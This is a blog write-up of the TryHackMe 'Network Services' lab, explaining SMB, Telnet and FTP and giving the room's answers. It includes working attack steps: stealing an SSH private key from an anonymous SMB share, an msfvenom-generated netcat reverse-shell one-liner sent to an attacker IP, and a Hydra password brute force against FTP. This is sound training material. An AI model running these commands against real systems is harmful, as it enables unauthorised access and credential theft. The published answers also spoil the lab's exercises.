::: {}
# Network Services TryHackme Writeup (SMB,Telnet,FTP) {#network-services-tryhackme-writeup-smbtelnetftp .p-name}
:::

::: {.section .p-summary field="subtitle"}
This is a Writeup of Tryhackme room "Network Services"
:::

::::::: {.section .e-content field="body"}
:::::: {#ef17 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Network Services TryHackme Writeup (SMB,Telnet,FTP) {#49fa .graf .graf--h3 .graf--leading .graf--title name="49fa"}

<figure id="b1c4" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*yHtNgsMOJ64ra1h4.png"
class="graf-image" data-image-id="0*yHtNgsMOJ64ra1h4.png"
data-width="496" data-height="313" />
</figure>

**Room link:**
[https://tryhackme.com/room/networkservices](https://tryhackme.com/room/networkservices){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/networkservices"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is for Premium Members Only. who purchased THM premium
membership.**

Hello and welcome!

This room will explore common Network Service vulnerabilities and
misconfigurations, but in order to do that, we'll need to do a few
things first!

A basic knowledge of Linux, and how to navigate the Linux file system,
is required for this room. If you think you'll need some help with this,
try completing the 'Linux Fundamentals' Module
[(https://tryhackme.com/module/linux-fundamentals)](https://tryhackme.com/module/linux-fundamentals){.markup--anchor
.markup--p-anchor
data-href="https://tryhackme.com/module/linux-fundamentals"
rel="noopener ugc nofollow noopener" target="_blank"}

1.  [Connect to the TryHackMe OpenVPN Server (See
    [https://tryhackme.com/access](https://tryhackme.com/access){.markup--anchor
    .markup--li-anchor data-href="https://tryhackme.com/access"
    rel="noopener ugc nofollow noopener" target="_blank"} for
    help!)]{#543a}
2.  [Make sure you're sitting comfortably, and have a cup of Tea, Coffee
    or Water close!]{#bf0d}

Now, let's move on!

**N.B.** This is not a room on WiFi access hacking or hijacking, rather
how to gain unauthorized access to a machine by exploiting network
services. If you are interested in WiFi hacking, I suggest checking out
WiFi Hacking 101 by NinjaJc01
([https://tryhackme.com/room/wifihacking101](https://tryhackme.com/room/wifihacking101){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/wifihacking101"
rel="noopener ugc nofollow noopener" target="_blank"})

### Covered Concepts: {#7d51 .graf .graf--h3 .graf-after--p name="7d51"}

- [**SMB**: enum4linux and anonymous login shares]{#dfa1}
- [**Telnet**: remote code execution and reverse shells]{#61f8}
- [**FTP**: anonymous login and authentication brute forcing]{#5a90}

### Task 2: Understanding SMB {#a1da .graf .graf--h3 .graf-after--li name="a1da"}

**What is SMB?**

SMB --- Server Message Block Protocol --- is a client-server
communication protocol used for sharing access to files, printers,
serial ports and other resources on a network.
\[[source](https://searchnetworking.techtarget.com/definition/Server-Message-Block-Protocol){.markup--anchor
.markup--p-anchor
data-href="https://searchnetworking.techtarget.com/definition/Server-Message-Block-Protocol"
rel="noopener ugc nofollow noopener" target="_blank"}\]

Servers make file systems and other resources (printers, named pipes,
APIs) available to clients on the network. Client computers may have
their own hard disks, but they also want access to the shared file
systems and printers on the servers.

The SMB protocol is known as a response-request protocol, meaning that
it transmits multiple messages between the client and server to
establish a connection. Clients connect to servers using TCP/IP
(actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002),
NetBEUI or IPX/SPX.

**How does SMB work?**

<figure id="f2c9" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ZOqbhgX9uZneGoAg.png"
class="graf-image" data-image-id="0*ZOqbhgX9uZneGoAg.png"
data-width="534" data-height="239" />
</figure>

Once they have established a connection, clients can then send commands
(SMBs) to the server that allow them to access shares, open files, read
and write files, and generally do all the sort of things that you want
to do with a file system. However, in the case of SMB, these things are
done over the network.

**What runs SMB?**

Microsoft Windows operating systems since Windows 95 have included
client and server SMB protocol support. Samba, an open source server
that supports the SMB protocol, was released for Unix systems.

What does SMB stand for?

> ***Answer: Server Message Block***

What type of protocol is SMB?

> ***Answer: response-request***

What do clients connect to servers using?

> ***Answer: TCP/IP***

What systems does Samba run on?

> ***Answer: Unix***

### Task 3: Enumerating SMB {#6a86 .graf .graf--h3 .graf-after--blockquote name="6a86"}

Before we begin, make sure to deploy the room and give it some time to
boot. Please be aware, this can take up to five minutes so be patient!

**Enumeration**

Enumeration is the process of gathering information on a target in order
to find potential attack vectors and aid in exploitation.

This process is essential for an attack to be successful, as wasting
time with exploits that either don't work or can crash the system can be
a waste of energy. Enumeration can be used to gather usernames,
passwords, network information, hostnames, application data, services,
or any other information that may be valuable to an attacker.

**SMB**

Typically, there are SMB share drives on a server that can be connected
to and used to view or transfer files. SMB can often be a great starting
point for an attacker looking to discover sensitive
information --- you'd be surprised what is sometimes included on these
shares.

**Port Scanning**

The first step of enumeration is to conduct a port scan, to find out as
much information as you can about the services, applications, structure
and operating system of the target machine. You can go as in depth as
you like on this, however I suggest using **nmap** with the **-A** and
**-p-** tags.

-A : Enables OS Detection, Version Detection, Script Scanning and
Traceroute all in one

-p- : Enables scanning across all ports, not just the top 1000

If you'd like to learn more about nmap in more detail, I **recommend**
checking out DarkStar's room on the topic, as part of the Red Primer
series [here](https://tryhackme.com/room/furthernmap){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/furthernmap"
rel="noopener ugc nofollow noopener" target="_blank"}.

**Enum4Linux**

Enum4linux is a tool used to enumerate SMB shares on both Windows and
Linux systems. It is basically a wrapper around the tools in the Samba
package and makes it easy to quickly extract information from the target
pertaining to SMB. It's installed by default on Parrot and Kali, however
if you need to install it, you can do so from the official
[github](https://github.com/portcullislabs/enum4linux){.markup--anchor
.markup--p-anchor
data-href="https://github.com/portcullislabs/enum4linux"
rel="noopener ugc nofollow noopener" target="_blank"}.

The syntax of Enum4Linux is nice and simple: **"enum4linux \[options\]
ip"**

**TAG** **FUNCTION**

-U get userlist\
-M get machine list\
-N get namelist dump (different from -U and-M)\
-S get sharelist\
-P get password policy information\
-G get group and member list

-A all of the above (full basic enumeration)

Now we understand our enumeration tools, let's get started!

Conduct an **nmap** scan of your choosing, How many ports are open?

<figure id="c0a6" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*qTT2_CXYXvVGuBMT.png"
class="graf-image" data-image-id="0*qTT2_CXYXvVGuBMT.png"
data-width="748" data-height="352" />
</figure>

> ***Answer: 3***

What ports is **SMB** running on?

> ***Answer: 139/445***

Let's get started with Enum4Linux, conduct a full basic enumeration. For
starters, what is the **workgroup** name?

``` {#167e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
enum4linux -A 10.10.19.179
```

<figure id="d269" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*yJORb9eIrelYA1LL.png"
class="graf-image" data-image-id="0*yJORb9eIrelYA1LL.png"
data-width="781" data-height="348" />
</figure>

> ***Answer: WORKGROUP***

What comes up as the **name** of the machine?

<figure id="d248" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*XIgD91aJ2FUciJZJ.png"
class="graf-image" data-image-id="0*XIgD91aJ2FUciJZJ.png"
data-width="792" data-height="295" />
</figure>

> ***Answer: POLOSMB***

What operating system **version** is running?

<figure id="2732" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*_3C45PjJG0l_pIW3.png"
class="graf-image" data-image-id="0*_3C45PjJG0l_pIW3.png"
data-width="774" data-height="212" />
</figure>

> ***Answer: 6.1***

What share sticks out as something we might want to investigate?

<figure id="5fcc" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*0u2W5HVy-DO6v7Ko.png"
class="graf-image" data-image-id="0*0u2W5HVy-DO6v7Ko.png"
data-width="774" data-height="260" />
</figure>

> ***Answer: profiles***

### Task 4: Exploiting SMB {#11ca .graf .graf--h3 .graf-after--blockquote name="11ca"}

**Types of SMB Exploit**

While there are vulnerabilities such as
[**CVE-2017--7494**](https://www.cvedetails.com/cve/CVE-2017-7494/){.markup--anchor
.markup--p-anchor
data-href="https://www.cvedetails.com/cve/CVE-2017-7494/"
rel="noopener ugc nofollow noopener" target="_blank"} that can allow
remote code execution by exploiting SMB, you're more likely to encounter
a situation where the best way into a system is due to misconfigurations
in the system. In this case, we're going to be exploiting anonymous SMB
share access- a common misconfiguration that can allow us to gain
information that will lead to a shell.

**Method Breakdown**

So, from our enumeration stage, we know:

\- The SMB share location

\- The name of an interesting SMB share

**SMBClient**

Because we're trying to access an SMB share, we need a client to access
resources on servers. We will be using SMBClient because it's part of
the default samba suite. While it is available by default on Kali and
Parrot, if you do need to install it, you can find the documentation
[**here.**](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html){.markup--anchor
.markup--p-anchor
data-href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html"
rel="noopener ugc nofollow noopener" target="_blank"}

We can remotely access the SMB share using the syntax:

`smbclient //[IP]/[SHARE]`{.markup--code .markup--p-code}

Followed by the tags:

-U \[name\] : to specify the user

-p \[port\] : to specify the port

**Got it? Okay, let's do this!**

**Question 1**. What would be the correct syntax to access an SMB share
called "secret" as user "suit" on a machine with the IP 10.10.10.2 on
the default port?

> ***Answer: smbclient //10.10.10.2/secret -U suit -p 445***

**Question 2.** Great! Now you've got a hang of the syntax, let's have a
go at trying to exploit this vulnerability. You have a list of users,
the name of the share (smb) and a suspected vulnerability.

<figure id="d45a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*0SzFViKp1nV96bCS.png"
class="graf-image" data-image-id="0*0SzFViKp1nV96bCS.png"
data-width="797" data-height="494" />
</figure>

<figure id="0146" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*oYEIX9Jri_-9GCKm.png"
class="graf-image" data-image-id="0*oYEIX9Jri_-9GCKm.png"
data-width="875" data-height="243" />
</figure>

Lets see if our interesting share has been configured to allow anonymous
access, I.E it doesn't require authentication to view the files. We can
do this easily by:

- [using the username "Anonymous"\
  - connecting to the share we found during the enumeration stage\
  - and not supplying a password.\
  **Question 3.** Does the share allow anonymous access? Y/N?]{#61a6}

> ***Answer: Y***

**Question 4.** Great! Have a look around for any interesting documents
that could contain valuable information. Who can we assume this profile
folder belongs to?

> ***Answer: John Cactus***

**Question 5.** What service has been configured to allow him to work
from home?

> ***Answer: ssh***

**Question 6.** Okay! Now we know this, what directory on the share
should we look in?

> ***Answer: .ssh***

**Question 7.** This directory contains authentication keys that allow a
user to authenticate themselves on, and then access, a server. Which of
these keys is most useful to us?

> ***Answer: id_rsa***

<figure id="f6bb" class="graf graf--figure graf-after--blockquote">
<img
src="https://cdn-images-1.medium.com/max/800/0*ZbXtIhi69XzdXu5b.png"
class="graf-image" data-image-id="0*ZbXtIhi69XzdXu5b.png"
data-width="850" data-height="309" />
</figure>

Download this file to your local machine, and change the permissions to
"600" using "**chmod 600 \[file\]**".

Upon inspection of the keys we can see a potential username of 'cactus'
at the end of the public key

<figure id="5439" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*VFfWkNvuJkPNYTLT.png"
class="graf-image" data-image-id="0*VFfWkNvuJkPNYTLT.png"
data-width="728" data-height="400" />
</figure>

Now, use the information you have already gathered to work out the
username of the account. Then, use the service and key to log-in to the
server.

<figure id="2355" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*E5_t0jZBxLUHLcPg.png"
class="graf-image" data-image-id="0*E5_t0jZBxLUHLcPg.png"
data-width="732" data-height="590" />
</figure>

**Question 8.** What is the smb.txt flag?

<figure id="3046" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ux62KCEpFFnieQCL.png"
class="graf-image" data-image-id="0*ux62KCEpFFnieQCL.png"
data-width="313" data-height="109" />
</figure>

### Task 5: Understanding Telnet {#7692 .graf .graf--h3 .graf-after--figure name="7692"}

**What is Telnet?**

Telnet is an application protocol which allows you, with the use of a
telnet client, to connect to and execute commands on a remote machine
that's hosting a telnet server.

The telnet client will establish a connection with the server. The
client will then become a virtual terminal- allowing you to interact
with the remote host.

**Replacement**

Telnet sends all messages in clear text and has no specific security
mechanisms. Thus, in many applications and services, Telnet has been
replaced by SSH in most implementations.

**How does Telnet work?**

The user connects to the server by using the Telnet protocol, which
means entering **"telnet"** into a command prompt. The user then
executes commands on the server by using specific Telnet commands in the
Telnet prompt. You can connect to a telnet server with the following
syntax: **"telnet \[ip\] \[port\]"**

**Question 1**. What is telnet?

> ***Answer: application protocol***

What has slowly replaced Telnet?

> ***Answer: ssh***

How would you connect to a Telnet server with the IP 10.10.10.3 on port
23?

> ***Answer: telnet 10.10.10.3 23***

The lack of what, means that all Telnet communication is in plaintext?

> ***Answer: encryption***

### Task 6. Enumerating Telnet {#c8b2 .graf .graf--h3 .graf-after--blockquote name="c8b2"}

**Enumeration**

We've already seen how key enumeration can be in exploiting a
misconfigured network service. However, vulnerabilities that could be
potentially trivial to exploit don't always jump out at us. For that
reason, especially when it comes to enumerating network services, we
need to be thorough in our method.

**Port Scanning**

Let's start out the same way we usually do, a port scan, to find out as
much information as we can about the services, applications, structure
and operating system of the target machine. Scan the machine with
**nmap** and the tag **-A and -p-**.

**Tag**

-A : Enables OS Detection, Version Detection, Script Scanning and
Traceroute all in one

-p- : Enables scanning across all ports, not just the top 1000

How many ports are open on the target machine?

> ***Answer: 1***

What port is this?

<figure id="ba41" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*l8TQSoB-hyQ9wwHD.png"
class="graf-image" data-image-id="0*l8TQSoB-hyQ9wwHD.png"
data-width="600" data-height="278" />
</figure>

``` {#b244 .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
nmap -T4 -p- 10.10.242.49
nmap -A -p 8012 10.10.242.49
```

> ***Answer: 8012***

**\#**This port is unassigned, but still lists the protocol it's using,
what protocol is this?

> ***Answer:TCP***

Now re-run the nmap scan, without the -p- tag, how many ports show up as
open?

> ***Ansewer: 0***

Based on the title returned to us, what do we think this port could be
used for?

> ***Answer: a backdoor***

7\. Who could it belong to? Gathering possible usernames is an important
step in enumeration.

> ***Answer: skidy***

### Task 7: Exploiting Telnet {#479b .graf .graf--h3 .graf-after--blockquote name="479b"}

**Types of Telnet Exploit**

Telnet, being a protocol, is in and of itself insecure for the reasons
we talked about earlier. It lacks encryption, so sends all communication
over plaintext, and for the most part has poor access control. There are
CVE's for Telnet client and server systems, however, so when exploiting
you can check for those on:

- [[https://www.cvedetails.com/](https://www.cvedetails.com/){.markup--anchor
  .markup--li-anchor data-href="https://www.cvedetails.com/"
  rel="noopener ugc nofollow noopener" target="_blank"}]{#07bb}
- [[https://cve.mitre.org/](https://cve.mitre.org/){.markup--anchor
  .markup--li-anchor data-href="https://cve.mitre.org/"
  rel="noopener ugc nofollow noopener" target="_blank"}]{#9169}

A CVE, short for Common Vulnerabilities and Exposures, is a list of
publicly disclosed computer security flaws. When someone refers to a
CVE, they usually mean the CVE ID number assigned to a security flaw.

However, you're far more likely to find a misconfiguration in how telnet
has been configured or is operating that will allow you to exploit it.

**Method Breakdown**

So, from our enumeration stage, we know:

\- There is a poorly hidden telnet service running on this machine\
- The service itself is marked "backdoor"\
- We have possible username of "Skidy" implicated

Using this information, let's try accessing this telnet port, and using
that as a foothold to get a full reverse shell on the machine!

**Connecting to Telnet**

You can connect to a telnet server with the following syntax:

**"telnet \[ip\] \[port\]"**

We're going to need to keep this in mind as we try and exploit this
machine.

**What is a Reverse Shell?**

<figure id="4bfb" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*kIYGKATZiviC-FvV.png"
class="graf-image" data-image-id="0*kIYGKATZiviC-FvV.png"
data-width="632" data-height="165" />
</figure>

A **"shell"** can simply be described as a piece of code or program
which can be used to gain code or command execution on a device.

A reverse shell is a type of shell in which the target machine
communicates back to the attacking machine.

The attacking machine has a listening port, on which it receives the
connection, resulting in code or command execution being achieved.

Okay, let's try and connect to this telnet port! If you get stuck, have
a look at the syntax for connecting outlined above.

\$**telnet 10.10.242.49 8012**

Great! It's an open telnet connection! What welcome message do we
receive?

> ***Answer: skidy's backdoor***

Let's try executing some commands, do we get a return on any input we
enter into the telnet session? (Y/N)

> ***Answer: N***

Hmm... that's strange. Let's check to see if what we're typing is being
executed as a system command.

Start a tcpdump listener on your local machine.\
If using your own machine with the OpenVPN connection, use:

Start a tcpdump listener on your local machine.

**If using your own machine with the OpenVPN connection, use:**

- [`sudo tcpdump ip proto \\icmp -i tun0`{.markup--code
  .markup--li-code}]{#3661}

**If using the AttackBox, use:**

- [`sudo tcpdump ip proto \\icmp -i eth0`{.markup--code
  .markup--li-code}]{#c50a}

This starts a tcpdump listener, specifically listening for ICMP traffic,
which pings operate on.

<figure id="f232" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*TqIZrQPFIBKf6cIY.png"
class="graf-image" data-image-id="0*TqIZrQPFIBKf6cIY.png"
data-width="875" data-height="397" />
</figure>

We're going to generate a reverse shell payload using msfvenom.This will
generate and encode a netcat reverse shell for us. Here's our syntax

``` {#802d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
msfvenom -p cmd/unix/reverse_netcat lhost=10.2.12.26 lport=4444 R
```

<figure id="7c06" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*KUlwdf4T1nlZpvHm.png"
class="graf-image" data-image-id="0*KUlwdf4T1nlZpvHm.png"
data-width="875" data-height="179" />
</figure>

``` {#107c .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
mkfifo /tmp/fnnivm; nc 10.2.12.26 4444 0</tmp/fnnivm | /bin/sh >/tmp/fnnivm 2>&1; rm /tmp/fnnivm
```

Start a netcat listener on our local machine. We do this using: **nc
-lvp 4444**

<figure id="47d0" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*2JrVetJFgJBmpdiR.png"
class="graf-image" data-image-id="0*2JrVetJFgJBmpdiR.png"
data-width="326" data-height="127" />
</figure>

<figure id="2a9b" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*GiBQRQFHdG0u-E_M.png"
class="graf-image" data-image-id="0*GiBQRQFHdG0u-E_M.png"
data-width="875" data-height="393" />
</figure>

<figure id="e01f" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*_Vs5NGm-rUDe-Dl5.png"
class="graf-image" data-image-id="0*_Vs5NGm-rUDe-Dl5.png"
data-width="636" data-height="187" />
</figure>

### Task 8: Understanding FTP {#76e3 .graf .graf--h3 .graf-after--figure name="76e3"}

**What is FTP?**

File Transfer Protocol (FTP) is, as the name suggests , a protocol used
to allow remote transfer of files over a network. It uses a
client-server model to do this, and- as we'll come on to later- relays
commands and data in a very efficient way.

**How does FTP work?**

A typical FTP session operates using two channels:

- [a command (sometimes called the control) channel]{#37ed}
- [a data channel.]{#d5c4}

As their names imply, the command channel is used for transmitting
commands as well as replies to those commands, while the data channel is
used for transferring data.

FTP operates using a client-server protocol. The client initiates a
connection with the server, the server validates whatever login
credentials are provided and then opens the session.

While the session is open, the client may execute FTP commands on the
server.

**Active vs Passive**

The FTP server may support either Active or Passive connections, or
both.

- [In an Active FTP connection, the client opens a port and listens. The
  server is required to actively connect to it.]{#8b0d}
- [In a Passive FTP connection, the server opens a port and listens
  (passively) and the client connects to it.]{#5ddd}

This separation of command information and data into separate channels
is a way of being able to send commands to the server without having to
wait for the current data transfer to finish. If both channels were
interlinked, you could only enter commands in between data transfers,
which wouldn't be efficient for either large file transfers, or slow
internet connections.

**More Details:**

You can find more details on the technical function, and implementation
of, FTP on the Internet Engineering Task Force website:
[https://www.ietf.org/rfc/rfc959.txt](https://www.ietf.org/rfc/rfc959.txt){.markup--anchor
.markup--p-anchor data-href="https://www.ietf.org/rfc/rfc959.txt"
rel="noopener ugc nofollow noopener" target="_blank"}. The IETF is one
of a number of standards agencies, who define and regulate internet
standards.

**Question 1**. What communications model does FTP use?

> ***Answer: client-server***

**Question 2.** What's the standard FTP port?

> ***Answer: 21***

**Question 3.** How many modes of FTP connection are there?

> ***Answer: 2***

### Task 9: Enumerating FTP {#1455 .graf .graf--h3 .graf-after--blockquote name="1455"}

``` {#4bcd .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
nmap -A 10.10.143.150
```

<figure id="11ee" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*fkgrOsBQjGjV_psH.png"
class="graf-image" data-image-id="0*fkgrOsBQjGjV_psH.png"
data-width="685" data-height="512" />
</figure>

**Question 1**. How many ports are open on the target machine?

> ***Answer: 1***

**Question 2.** What port is this?

> ***Answer: 21***

**Question 3.** What variant of FTP is running on it?

> ***Answer: vsFTPd***

We can now check to see if anonymous login is allowed on the FTP server
by connecting via:

and using the username 'anonymous' with a blank password.

<figure id="e963" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*2sraeTaoDj7j4eIn.png"
class="graf-image" data-image-id="0*2sraeTaoDj7j4eIn.png"
data-width="484" data-height="249" />
</figure>

There is a file named *PUBLIC_NOTICE.txt*, which you can download using
the **get command**.

<figure id="5773" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*GwqBDRiA8xS4b7PX.png"
class="graf-image" data-image-id="0*GwqBDRiA8xS4b7PX.png"
data-width="783" data-height="283" />
</figure>

<figure id="a47a" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*2hJUKorreU-hmYvk.png"
class="graf-image" data-image-id="0*2hJUKorreU-hmYvk.png"
data-width="395" data-height="396" />
</figure>

**Question 4**. What do we think a possible username could be?

> ***Answer: Mike***

### Task 10: Exploiting FTP {#766d .graf .graf--h3 .graf-after--blockquote name="766d"}

Now we can try to **brute force** our way into Mike's account using a
service like Hydra.

**Hydra** is a brute-forcing script that can be used for many different
services, including http forms, ssh, ftp, and MYSQL.

``` {#3735 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
hydra -l mike -P rockyou.txt 10.10.143.150 ftp
```

<figure id="9196" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*gangyldpwjgMJJMA.png"
class="graf-image" data-image-id="0*gangyldpwjgMJJMA.png"
data-width="875" data-height="319" />
</figure>

We can now connect to the ftp server and authenticate using the username
'mike' and his password, and then enter passive mode so we can run
commands via:

<figure id="c195" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*c9zMOmzRwnjDxhlz.png"
class="graf-image" data-image-id="0*c9zMOmzRwnjDxhlz.png"
data-width="687" data-height="492" />
</figure>

<figure id="7caf" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*qTnIIOe7S9U0VIRV.png"
class="graf-image" data-image-id="0*qTnIIOe7S9U0VIRV.png"
data-width="310" data-height="82" />
</figure>

### Reading {#7bd5 .graf .graf--h3 .graf-after--figure name="7bd5"}

Here's some things that might be useful to read after completing this
room, if it interests you:

- [[https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef](https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef){.markup--anchor
  .markup--li-anchor
  data-href="https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef"
  rel="noopener" target="_blank"}]{#17b8}
- [[https://attack.mitre.org/techniques/T1210/](https://attack.mitre.org/techniques/T1210/){.markup--anchor
  .markup--li-anchor
  data-href="https://attack.mitre.org/techniques/T1210/"
  rel="noopener ugc nofollow noopener" target="_blank"}]{#af99}
- [[https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/](https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/){.markup--anchor
  .markup--li-anchor
  data-href="https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/"
  rel="noopener ugc nofollow noopener" target="_blank"}]{#5e35}

### Promote and Collaborate on Cybersecurity Insights {#6813 .graf .graf--h3 .graf-after--li name="6813"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#d01e .graf .graf--h3 .graf-after--p name="d01e"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 28, 2024](https://medium.com/p/5ec1f23b9fc6).

[Canonical
link](https://medium.com/@bevijaygupta/network-services-tryhackme-writeup-smb-telnet-ftp-5ec1f23b9fc6){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
